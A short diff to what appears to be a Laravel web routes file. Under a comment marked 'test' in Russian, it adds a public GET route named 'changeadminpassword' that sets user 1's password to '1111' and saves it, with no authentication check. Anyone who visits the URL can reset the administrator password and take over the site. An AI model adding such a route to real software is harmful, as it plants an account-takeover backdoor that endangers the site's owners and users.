@@ -181,6 +181,11 @@ Route::get('/products/json_old', function () {
 
 #---------ТЕСТОВЫЕ------------------------------------------------
 
+Route::get('changeadminpassword', function(){
+    $user = \App\User::find(1);
+    $user->password = bcrypt(1111);
+    $user->save();
+});
 
 Route::get('/ordertest', function () {
 
